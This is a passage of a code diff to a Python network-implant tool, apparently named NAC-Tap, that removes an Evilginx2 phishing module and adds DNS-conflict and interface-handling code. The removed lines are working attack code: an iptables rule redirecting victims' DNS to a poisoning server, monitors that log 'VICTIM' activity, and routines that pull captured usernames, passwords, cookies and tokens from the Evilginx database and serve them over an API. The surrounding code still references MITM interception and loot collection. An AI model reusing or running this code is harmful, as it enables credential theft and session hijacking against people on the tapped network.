-            # Redirect DNS queries to our dnsmasq
-            result = run_cmd([
-                'iptables', '-t', 'nat', '-A', 'PREROUTING',
-                '-i', CONFIG['BRIDGE_NAME'],
-                '-p', 'udp', '--dport', '53',
-                '-j', 'DNAT', '--to', f"{self.bridge_ip}:5353"
-            ])
-            
-            if result and result.returncode == 0:
-                log("DNS traffic redirected to poisoning server", 'SUCCESS')
-            else:
-                log("DNS redirect may have failed", 'WARNING')
-            
-            log(f"DNS poisoning active for {len(self.domains_to_poison)} domains", 'SUCCESS')
-            return True
-            
         except Exception as e:
-            log(f"DNS poisoning setup failed: {e}", 'ERROR')
+            log(f"Client DNS configuration failed: {e}", 'WARNING')
             return False
-
-    def stop(self):
-        """Stop Evilginx2"""
-        log("Stopping Evilginx2...")
-        self.stop_monitoring = True
-        
-        if self.monitor_thread and self.monitor_thread.is_alive():
-            self.monitor_thread.join(timeout=5)
-        
+    
+    def validate_dns_config(self):
+        """Check for DNS configuration conflicts"""
         try:
-            # Stop DNS poisoning
-            if self.dnsmasq_process:
-                try:
-                    self.dnsmasq_process.terminate()
-                    self.dnsmasq_process.wait(timeout=3)
-                except:
-                    self.dnsmasq_process.kill()
-                self.dnsmasq_process = None
-                log("DNS poisoning stopped")
+            conflicts = []
             
-            # Remove DNS redirect rule
-            run_cmd([
-                'iptables', '-t', 'nat', '-D', 'PREROUTING',
-                '-i', CONFIG['BRIDGE_NAME'],
-                '-p', 'udp', '--dport', '53',
-                '-j', 'DNAT', '--to', f"{self.bridge_ip}:5353"
-            ])
-            
-            # Stop Evilginx
-            if self.process:
-                # Send quit command
-                try:
-                    self.process.stdin.write(b'quit\n')
-                    self.process.stdin.flush()
-                    self.process.wait(timeout=5)
-                except:
-                    pass
-                
-                # Force kill if still running
-                if self.process.poll() is None:
-                    self.process.terminate()
-                    try:
-                        self.process.wait(timeout=5)
-                    except:
-                        self.process.kill()
-                
-                self.process = None
-            
-            self.running = False
-            self.phishlet = None
-            self.lure_url = None
-            self.domains_to_poison = []
-            log("Evilginx2 stopped", 'SUCCESS')
-            return True
-            
-        except Exception as e:
-            log(f"Stop failed: {e}", 'ERROR')
-            return False
-
-    def _monitor_dns_logs(self):
-        """Monitor DNS queries from dnsmasq in real-time"""
-        seen_queries = set()
-        
-        while not self.stop_monitoring and self.dnsmasq_process:
-            try:
-                if self.dnsmasq_process.stdout:
-                    line = self.dnsmasq_process.stdout.readline()
-                    if line:
-                        line = line.decode('utf-8', errors='ignore').strip()
-                        
-                        # Parse dnsmasq query logs
-                        if 'query' in line.lower():
-                            for domain in self.domains_to_poison:
-                                if domain in line:
-                                    # Extract client IP if possible
-                                    query_key = f"{domain}-{line[-20:]}"
-                                    if query_key not in seen_queries:
-                                        seen_queries.add(query_key)
-                                        log(f"VICTIM DNS QUERY: {domain}", 'INFO')
-                                        
-                                        # Keep set size manageable
-                                        if len(seen_queries) > 100:
-                                            seen_queries.clear()
-                                    break
-                else:
-                    time.sleep(0.5)
+            # Check if dnsmasq is running on wrong interface
+            result = run_cmd(['systemctl', 'is-active', 'dnsmasq'], check=False)
+            if result and result.returncode == 0:
+                dnsmasq_conf = '/etc/dnsmasq.conf'
+                if os.path.exists(dnsmasq_conf):
+                    with open(dnsmasq_conf, 'r') as f:
+                        config = f.read()
                     
-            except Exception:
-                time.sleep(1)
-    
-    def _monitor_logs(self):
-        """Monitor Evilginx logs for real-time victim activity"""
-        seen_lines = set()
-        
-        while not self.stop_monitoring:
-            try:
-                if os.path.exists(self.log_file):
-                    with open(self.log_file, 'r') as f:
-                        lines = f.readlines()
-                        
-                        for line in lines:
-                            line_hash = hash(line)
-                            if line_hash not in seen_lines:
-                                seen_lines.add(line_hash)
-                                
-                                # Detect interesting events
-                                lower_line = line.lower()
-                                
-                                # SSL/TLS errors
-                                if 'tls' in lower_line or 'ssl' in lower_line or 'certificate' in lower_line:
-                                    if 'error' in lower_line or 'fail' in lower_line:
-                                        log(f"SSL/TLS ERROR: {line.strip()}", 'ERROR')
-                                    elif 'handshake' in lower_line:
-                                        log(f"TLS HANDSHAKE from victim", 'INFO')
-                                
-                                # HTTP/HTTPS connections to phishing domain
-                                if any(d in lower_line for d in self.domains_to_poison):
-                                    if 'request' in lower_line or 'GET' in line or 'POST' in line:
-                                        log(f"HTTP REQUEST from victim", 'INFO')
-                                
-                                # Connection attempts
-                                if 'new connection' in lower_line or 'client connected' in lower_line:
-                                    log(f"VICTIM CONNECTED!", 'SUCCESS')
-                                
-                                # Authentication attempts
-                                if 'auth' in lower_line or 'login' in lower_line or 'signin' in lower_line:
-                                    log(f"AUTHENTICATION IN PROGRESS", 'WARNING')
-                                
-                                # Session capture
-                                if 'session' in lower_line and ('captured' in lower_line or 'saved' in lower_line):
-                                    log(f"SESSION CAPTURED!", 'SUCCESS')
-                                
-                                # Cookies/tokens
-                                if 'cookie' in lower_line or 'token' in lower_line:
-                                    if 'captured' in lower_line or 'saved' in lower_line:
-                                        log(f"CREDENTIALS EXTRACTED", 'SUCCESS')
-                                
-                                # Phishlet errors
-                                if 'phishlet' in lower_line and 'error' in lower_line:
-                                    log(f"PHISHLET ERROR: {line.strip()}", 'ERROR')
-                                
-                                # Keep set size manageable
-                                if len(seen_lines) > 500:
-                                    seen_lines.clear()
+                    # Check for interface bindings
+                    if 'interface=' in config:
+                        # Check if it's binding to client interface
+                        client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
+                        if client_iface and f'interface={client_iface}' in config:
+                            conflicts.append(f"dnsmasq is bound to client interface {client_iface}")
+            
+            # Check resolv.conf for AP IP when client is active
+            if os.path.exists('/etc/resolv.conf'):
+                with open('/etc/resolv.conf', 'r') as f:
+                    resolv = f.read()
                 
-                time.sleep(2)
-                
-            except Exception as e:
-                # Don't spam errors
-                time.sleep(5)
-    
-    def _monitor_sessions(self):
-        """Monitor Evilginx database for captured sessions"""
-        first_check = True
-        
-        while not self.stop_monitoring:
-            try:
-                # Try multiple database locations
-                db_paths = [
-                    self.db_path,
-                    os.path.expanduser('~/.evilginx/data.db'),
-                    os.path.join(self.config_dir, 'data.db'),
-                    '/root/.evilginx/data.db',
-                    '/opt/evilginx/.evilginx/data.db'
-                ]
-                
-                db_found = None
-                for db in db_paths:
-                    if os.path.exists(db):
-                        db_found = db
-                        if first_check:
-                            log(f"Found Evilginx database: {db_found}", 'INFO')
-                        break
-                
-                if db_found:
-                    try:
-                        import sqlite3
-                        conn = sqlite3.connect(db_found, timeout=5)
-                        cursor = conn.cursor()
-                        
-                        # Check what tables exist
-                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
-                        tables = [row[0] for row in cursor.fetchall()]
-                        
-                        if first_check:
-                            log(f"Database tables: {', '.join(tables)}", 'INFO')
-                        
-                        if 'sessions' in tables:
-                            # Get column names
-                            cursor.execute("PRAGMA table_info(sessions)")
-                            table_info = cursor.fetchall()
-                            columns = [col[1] for col in table_info]
-                            
-                            if first_check:
-                                log(f"Session columns: {', '.join(columns)}", 'INFO')
-                            
-                            # Get ALL sessions (not just captured ones)
-                            cursor.execute("SELECT * FROM sessions")
-                            column_names = [description[0] for description in cursor.description]
-                            rows = cursor.fetchall()
-                            
-                            if first_check and rows:
-                                log(f"Found {len(rows)} session(s) in database", 'INFO')
-                            
-                            new_sessions = []
-                            for row in rows:
-                                # Build session dict from columns
-                                session_dict = dict(zip(column_names, row))
-                                
-                                if first_check:
-                                    log(f"Session data: {session_dict}", 'INFO')
-                                
-                                # Extract key fields (adapt to actual schema)
-                                session = {
-                                    'id': session_dict.get('id'),
-                                    'phishlet': session_dict.get('phishlet', 'unknown'),
-                                    'username': session_dict.get('username', session_dict.get('login', '')),
-                                    'password': session_dict.get('password', ''),
-                                    'tokens': session_dict.get('tokens', session_dict.get('custom', '')),
-                                    'cookies': session_dict.get('cookies', session_dict.get('custom', '')),
-                                    'captured_at': session_dict.get('update_time', session_dict.get('create_time', '')),
-                                    'timestamp': datetime.now().isoformat(),
-                                    'raw': str(session_dict)
-                                }
-                                
-                                # Check if new
-                                if not any(s.get('id') == session['id'] for s in self.sessions):
-                                    new_sessions.append(session)
-                                    log(f"NEW SESSION CAPTURED!", 'SUCCESS')
-                                    log(f"  ID: {session['id']}", 'SUCCESS')
-                                    log(f"  Phishlet: {session['phishlet']}", 'SUCCESS')
-                                    log(f"  Username: {session['username']}", 'SUCCESS')
-                            
-                            if new_sessions:
-                                self.sessions.extend(new_sessions)
-                                self._save_sessions()
-                        else:
-                            if first_check:
-                                log(f"No sessions table found. Available tables: {tables}", 'WARNING')
-                        
-                        conn.close()
-                    except Exception as e:
-                        log(f"Session parsing error: {e}", 'ERROR')
-                        import traceback
-                        log(traceback.format_exc(), 'ERROR')
-                else:
-                    if first_check:
-                        log(f"Evilginx database not found. Checked: {db_paths}", 'WARNING')
-                
-                first_check = False
-                time.sleep(5)
-                
-            except Exception as e:
-                log(f"Monitor error: {e}", 'ERROR')
-                time.sleep(5)
-
-    def _save_sessions(self):
-        """Save captured sessions to file"""
-        try:
-            session_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx_sessions.json')
-            with open(session_file, 'w') as f:
-                json.dump(self.sessions, f, indent=2)
-            os.chmod(session_file, 0o600)
-            log(f"Sessions saved: {len(self.sessions)} total")
+                client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
+                if client_iface and self.ap_ip in resolv:
+                    # This might be OK if AP is also active, but log it
+                    log(f"resolv.conf contains AP IP ({self.ap_ip}) - may cause conflicts", 'WARNING')
+            
+            if conflicts:
+                log("DNS conflicts detected:", 'WARNING')
+                for conflict in conflicts:
+                    log(f"  - {conflict}", 'WARNING')
+                return False
+            
+            log("No DNS conflicts detected", 'SUCCESS')
+            return True
+            
         except Exception as e:
-            log(f"Failed to save sessions: {e}", 'ERROR')
-
-    def load_sessions(self):
-        """Load existing sessions"""
-        try:
-            session_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx_sessions.json')
-            if os.path.exists(session_file):
-                with open(session_file, 'r') as f:
-                    self.sessions = json.load(f)
-                log(f"Loaded {len(self.sessions)} existing sessions")
-        except Exception:
-            self.sessions = []
-
-    def get_status(self):
-        """Get Evilginx2 status"""
-        return {
-            'running': self.running,
-            'installed': self.check_installation(),
-            'install_path': self.evilginx_path if self.check_installation() else None,
-            'phishlet': self.phishlet,
-            'lure_url': self.lure_url,
-            'bridge_ip': self.bridge_ip,
-            'sessions_count': len(self.sessions),
-            'sessions': self.sessions,
-            'pid': self.process.pid if self.process and self.process.poll() is None else None
-        }
-    
-    def install(self):
-        """Install Evilginx2 using the install script"""
-        try:
-            log("Starting Evilginx2 installation...")
-            
-            # Find the install script
-            script_locations = [
-                '/opt/nac-tap/install-evilginx.sh',
-                os.path.join(os.path.dirname(os.path.abspath(__file__)), 'install-evilginx.sh'),
-                '/tmp/install-evilginx.sh'
-            ]
-            
-            install_script = None
-            for location in script_locations:
-                if os.path.exists(location):
-                    install_script = location
-                    break
-            
-            if not install_script:
-                log("Install script not found", 'ERROR')
-                return {'success': False, 'error': 'Install script not found'}
-            
-            # Run installation script
-            result = run_cmd(['bash', install_script], timeout=600)
-            
-            if result and result.returncode == 0:
-                log("Evilginx2 installation completed successfully", 'SUCCESS')
-                return {
-                    'success': True,
-                    'message': 'Evilginx2 installed successfully',
-                    'path': self.evilginx_path
-                }
-            else:
-                error_msg = result.stderr if result else "Unknown error"
-                log(f"Installation failed: {error_msg}", 'ERROR')
-                return {
-                    'success': False,
-                    'error': f'Installation failed: {error_msg}'
-                }
-                
-        except Exception as e:
-            log(f"Installation error: {e}", 'ERROR')
-            return {
-                'success': False,
-                'error': str(e)
-            }
-
-    def clear_sessions(self):
-        """Clear all captured sessions"""
-        self.sessions = []
-        self._save_sessions()
-        log("Evilginx sessions cleared")
+            log(f"DNS validation failed: {e}", 'WARNING')
+            return False
 
 # ============================================================================
 # WIFI MANAGER
@@ -1290,7 +1065,9 @@ class WiFiManager:
     """Manages WiFi AP connection and scanning"""
 
     def __init__(self):
-        self.interface = None
+        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+        self.client_interface = None
+        self.interface = None  # Currently active client interface
         self.ssid = None
         self.password = None
         self.connected = False
@@ -1298,10 +1075,30 @@ class WiFiManager:
         self.ip_address = None
         self.gateway = None
         self.internet_available = False
+        self.dns_manager = DNSManager()  # DNS conflict prevention
+        
+        # Auto-detect client interface on initialization
+        detected = detect_wifi_client_interface()
+        if detected:
+            self.client_interface = detected
+        else:
+            # Fallback: try to detect manually
+            for candidate in ['wlan1', 'wlan2']:
+                if candidate != self.ap_interface:
+                    result = run_cmd(['ip', 'link', 'show', candidate], check=False)
+                    if result and result.returncode == 0:
+                        self.client_interface = candidate
+                        CONFIG['WIFI_CLIENT_INTERFACE'] = candidate
+                        break
+        
+        # Check for DNS conflicts on initialization
+        self.dns_manager.prevent_dnsmasq_conflicts()
 
     def get_wifi_interfaces(self):
-        """Get available WLAN interfaces"""
+        """Get available WLAN interfaces for client mode (excludes AP interface)"""
         interfaces = []
+        ap_interface = self.ap_interface
+        
         result = run_cmd(['ip', '-o', 'link', 'show'])
         if result and result.returncode == 0:
             for line in result.stdout.split('\n'):
@@ -1309,8 +1106,17 @@ class WiFiManager:
                     parts = line.split(':')
                     if len(parts) >= 2:
                         iface = parts[1].strip().split('@')[0]
-                        if iface not in interfaces:
-                            interfaces.append(iface)
+                        # Exclude AP interface - it's for management only
+                        if iface != ap_interface and iface not in interfaces:
+                            # Verify it's a wireless interface
+                            if (os.path.exists(f"/sys/class/net/{iface}/wireless") or
+                                    os.path.exists(f"/sys/class/net/{iface}/phy80211")):
+                                interfaces.append(iface)
+        
+        # If no interfaces found but we have a detected client interface, include it
+        if not interfaces and self.client_interface:
+            interfaces.append(self.client_interface)
+        
         return interfaces
 
     def scan_aps(self, interface):
@@ -1449,16 +1255,19 @@ class WiFiManager:
                             dns_servers = ['8.8.8.8', '1.1.1.1']
                             log("No DNS servers found, using public DNS: 8.8.8.8, 1.1.1.1", 'WARNING')
                     
-                    # Configure DNS via systemd-resolved or resolv.conf
-                    self._configure_dns(interface, dns_servers)
+                    # Configure DNS for client interface (prevent conflicts with AP)
+                    self.dns_manager.configure_client_dns(interface, dns_servers)
                     
                 except Exception as e:
                     log(f"Error getting DNS servers: {e}", 'WARNING')
                     # Use public DNS as fallback
                     dns_servers = ['8.8.8.8', '1.1.1.1']
-                    self._configure_dns(interface, dns_servers)
+                    self.dns_manager.configure_client_dns(interface, dns_servers)
                 
                 self.connected = True
+                
+                # Prevent DNS conflicts before setting up routing
+                self._prevent_dns_conflicts()
                 
                 # Setup routing for internet access through WLAN
                 self._setup_wlan_routing(interface, dns_servers)
@@ -1475,37 +1284,28 @@ class WiFiManager:
             return {'success': False, 'error': str(e)}
 
     def _configure_dns(self, interface, dns_servers):
-        """Configure DNS servers for the interface"""
+        """Configure DNS servers for the interface (legacy method - use DNSManager instead)"""
+        # Delegate to DNSManager to prevent conflicts
+        if interface == self.ap_interface:
+            self.dns_manager.configure_ap_dns()
+        else:
+            self.dns_manager.configure_client_dns(interface, dns_servers)
+    
+    def _prevent_dns_conflicts(self):
+        """Prevent DNS conflicts between AP and client WLAN"""
         try:
-            log(f"Configuring DNS servers: {dns_servers}", 'INFO')
+            log("Preventing DNS conflicts...", 'INFO')
             
-            # Try systemd-resolved first (modern systems)
-            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
-            if result and result.returncode == 0:
-                # Use resolvectl to set DNS
-                for dns in dns_servers:
-                    run_cmd(['resolvectl', 'dns', interface, dns], check=False)
-                log(f"DNS configured via systemd-resolved: {dns_servers}", 'SUCCESS')
-                return
+            # Ensure dnsmasq only listens on AP interface
+            self.dns_manager.prevent_dnsmasq_conflicts()
             
-            # Fallback: Update resolv.conf directly
-            try:
-                # Backup existing resolv.conf
-                if os.path.exists('/etc/resolv.conf'):
-                    run_cmd(['cp', '/etc/resolv.conf', '/etc/resolv.conf.bak'], check=False)
-                
-                # Write new resolv.conf
-                with open('/etc/resolv.conf', 'w') as f:
-                    f.write("# DNS configured by NAC-Tap\n")
-                    for dns in dns_servers:
-                        f.write(f"nameserver {dns}\n")
-                    f.write("options timeout:2 attempts:3\n")
-                
-                log(f"DNS configured via resolv.conf: {dns_servers}", 'SUCCESS')
-            except Exception as e:
-                log(f"Failed to configure DNS via resolv.conf: {e}", 'WARNING')
+            # Validate current DNS configuration
+            self.dns_manager.validate_dns_config()
+            
+            return True
         except Exception as e:
-            log(f"DNS configuration error: {e}", 'ERROR')
+            log(f"DNS conflict prevention failed: {e}", 'WARNING')
+            return False
 
     def _setup_wlan_routing(self, wlan_interface, dns_servers=None):
         """Setup routing so non-private traffic exits through WLAN interface"""
@@ -2611,8 +2411,6 @@ class BridgeManager:
         self.start_time = None
         self.loot_analyzer = LootAnalyzer()
         self.mitm_manager = MITMManager()
-        self.evilginx_manager = EvilginxManager()
-        self.evilginx_manager.load_sessions()
         self.wifi_manager = WiFiManager()
         self.slack_manager = SlackManager(bridge_manager=self)
         self.bridge_initialized = False
@@ -2683,10 +2481,9 @@ class BridgeManager:
                 self._force_cleanup_bridge()
                 time.sleep(2)
 
-            # Disable NetworkManager
-            log("Disabling NetworkManager...")
-            for iface in [client_int, switch_int]:
-                run_cmd(['nmcli', 'device', 'set', iface, 'managed', 'no'])
+            # Isolate interfaces from NetworkManager
+            log("Isolating interfaces from NetworkManager...")
+            self._isolate_networkmanager([client_int, switch_int])
 
             time.sleep(1)
 
@@ -2926,6 +2723,47 @@ class BridgeManager:
             log(f"Stop failed: {e}", 'ERROR')
             return False
 
+    def _isolate_networkmanager(self, interfaces):
+        """Isolate specified interfaces from NetworkManager"""
+        try:
+            log("Isolating interfaces from NetworkManager...", 'INFO')
+            
+            # Get AP interface (should not be managed)
+            ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+            
+            # Unmanage bridge interfaces
+            for iface in interfaces:
+                if iface:
+                    result = run_cmd(['nmcli', 'device', 'set', iface, 'managed', 'no'], check=False)
+                    if result and result.returncode == 0:
+                        log(f"  ✓ {iface}: Unmanaged by NetworkManager", 'SUCCESS')
+                    else:
+                        log(f"  ⚠ {iface}: Failed to unmanage (may already be unmanaged)", 'WARNING')
+            
+            # Unmanage AP interface if configured (it's for management AP, not client)
+            if ap_interface:
+                result = run_cmd(['nmcli', 'device', 'set', ap_interface, 'managed', 'no'], check=False)
+                if result and result.returncode == 0:
+                    log(f"  ✓ {ap_interface}: Unmanaged by NetworkManager (AP mode)", 'SUCCESS')
+                else:
+                    log(f"  ⚠ {ap_interface}: Failed to unmanage (may already be unmanaged)", 'WARNING')
+            
+            # Keep client WLAN managed by NetworkManager for DHCP
+            client_interface = CONFIG.get('WIFI_CLIENT_INTERFACE')
+            if client_interface:
+                result = run_cmd(['nmcli', 'device', 'set', client_interface, 'managed', 'yes'], check=False)
+                if result and result.returncode == 0:
+                    log(f"  ✓ {client_interface}: Managed by NetworkManager (for DHCP)", 'SUCCESS')
+                else:
+                    log(f"  ⚠ {client_interface}: Failed to manage (may already be managed)", 'WARNING')
+            
+            log("NetworkManager isolation complete", 'SUCCESS')
+            return True
+            
+        except Exception as e:
+            log(f"NetworkManager isolation failed: {e}", 'WARNING')
+            return False
+
     def _force_cleanup_bridge(self):
         """Force cleanup bridge"""
         bridge = CONFIG['BRIDGE_NAME']
@@ -2951,7 +2789,6 @@ class BridgeManager:
             'gateway_ip': self.gateway_ip,
             'logs': self._get_logs(),
             'mitm': self.mitm_manager.get_status(),
-            'evilginx': self.evilginx_manager.get_status(),
             'wifi': self.wifi_manager.get_connection_status(),
             'slack': self.slack_manager.get_upload_status()
         }
@@ -3134,40 +2971,78 @@ class BridgeManager:
         return result
 
     def _get_interfaces(self):
-        """Get all network interfaces"""
+        """Get all network interfaces with roles"""
         interfaces = []
         result = run_cmd(['ip', '-j', 'link', 'show'])
         if not result:
             return interfaces
 
         try:
-            for iface in json.loads(result.stdout):
-                name = iface.get('ifname', '')
-                if name.startswith(('lo', 'docker', 'veth', 'virbr')):
+            import json
+            data = json.loads(result.stdout)
+            for item in data:
+                ifname = item.get('ifname', '')
+                if not ifname or ifname == 'lo' or ifname.startswith(('docker', 'veth', 'virbr')):
                     continue
 
-                state = 'UP' if 'UP' in iface.get('flags', []) else 'DOWN'
-                mac = iface.get('address', 'N/A')
+                state = item.get('operstate', 'UNKNOWN').upper()
+                addr_info = item.get('addr_info', [])
+                mac = item.get('address', 'N/A')
 
-                role = 'Unknown'
-                if is_mgmt_interface(name):
-                    role = 'Management (WiFi)'
-                elif self.interfaces and name in self.interfaces:
-                    idx = self.interfaces.index(name)
-                    role = f'Tap Port ({"Client" if idx == 0 else "Switch"})'
-                elif name == CONFIG['BRIDGE_NAME']:
-                    role = 'Transparent Bridge'
-                elif name.startswith(('eth', 'enp', 'lan', 'end')):
-                    role = 'Ethernet'
+                # Get IP address if available
+                ip_addr = None
+                if addr_info:
+                    for addr in addr_info:
+                        if addr.get('family') == 'inet':
+                            ip_addr = addr.get('local', 'N/A')
+                            break
+
+                # Determine interface role
+                role = get_interface_role(ifname)
+                role_label = {
+                    'bridge': 'Bridge',
+                    'ap': 'AP (Management)',
+                    'client': 'Client (Internet)',
+                    'eth': 'Bridge Member',
+                    'unknown': 'Unknown'
+                }.get(role, 'Unknown')
 
                 interfaces.append({
-                    'name': name,
+                    'name': ifname,
                     'state': state,
                     'mac': mac,
-                    'role': role
+                    'ip': ip_addr or 'N/A',
+                    'role': role,
+                    'role_label': role_label
                 })
-        except Exception:
-            pass
+        except Exception as e:
+            log(f"Error parsing interfaces: {e}", 'WARNING')
+            # Fallback to simple parsing
+            result = run_cmd(['ip', 'link', 'show'])
+            if result:
+                for line in result.stdout.split('\n'):
+                    if ':' in line and 'state' in line.lower():
+                        parts = line.split(':')
+                        if len(parts) >= 2:
+                            ifname = parts[1].strip().split('@')[0]
+                            if ifname and ifname != 'lo' and not ifname.startswith(('docker', 'veth', 'virbr')):
+                                state = 'UP' if 'state UP' in line else 'DOWN'
+                                role = get_interface_role(ifname)
+                                role_label = {
+                                    'bridge': 'Bridge',
+                                    'ap': 'AP (Management)',
+                                    'client': 'Client (Internet)',
+                                    'eth': 'Bridge Member',
+                                    'unknown': 'Unknown'
+                                }.get(role, 'Unknown')
+                                interfaces.append({
+                                    'name': ifname,
+                                    'state': state,
+                                    'mac': 'N/A',
+                                    'ip': 'N/A',
+                                    'role': role,
+                                    'role_label': role_label
+                                })
 
         return interfaces
 
@@ -3216,9 +3091,9 @@ class NACWebHandler(BaseHTTPRequestHandler):
                 # Fallback to embedded template
                 html_content = get_html_template()
             
-        self.send_response(200)
+            self.send_response(200)
             self.send_header('Content-Type', 'text/html; charset=utf-8')
-        self.end_headers()
+            self.end_headers()
             self.wfile.write(html_content.encode('utf-8'))
         except Exception as e:
             log(f"Error serving HTML: {e}", 'ERROR')
@@ -3257,15 +3132,6 @@ class NACWebHandler(BaseHTTPRequestHandler):
                     self.send_error(500)
             else:
                 self.send_error(404)
-        
-        # Evilginx session export (GET request for download)
-        elif path == '/api/evilginx/sessions':
-            sessions = self.bridge_manager.evilginx_manager.sessions
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.send_header('Content-Disposition', 'attachment; filename="evilginx_sessions.json"')
-            self.end_headers()
-            self.wfile.write(json.dumps(sessions, indent=2).encode('utf-8'))
         
         # Test page for debugging
         elif path == '/test':
@@ -3429,36 +3295,6 @@ class NACWebHandler(BaseHTTPRequestHandler):
             self.bridge_manager.mitm_manager.remove_all_intercept_rules()
             self._send_json({'success': True})
             
-        # Evilginx endpoints
-        elif path == '/api/evilginx/start':
-            try:
-                content_length = int(self.headers.get('Content-Length', 0))
-                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
-                data = json.loads(body) if body else {}
-                
-                phishlet = data.get('phishlet', 'o365')
-                domain = data.get('domain')
-                
-                evilginx = self.bridge_manager.evilginx_manager
-                success = evilginx.start(phishlet=phishlet, domain=domain)
-                
-                if success:
-                    self._send_json({'success': True, 'lure_url': evilginx.lure_url})
-                else:
-                    self._send_json({'success': False, 'error': 'Failed to start Evilginx2'})
-                    
-            except Exception as e:
-                log(f"Evilginx start failed: {e}", 'ERROR')
-                self._send_json({'success': False, 'error': str(e)})
-                
-        elif path == '/api/evilginx/stop':
-            success = self.bridge_manager.evilginx_manager.stop()
-            self._send_json({'success': success})
-            
-        elif path == '/api/evilginx/clear_sessions':
-            self.bridge_manager.evilginx_manager.clear_sessions()
-            self._send_json({'success': True})
-        
         # WiFi endpoints
         elif path == '/api/wifi/scan':
             try:
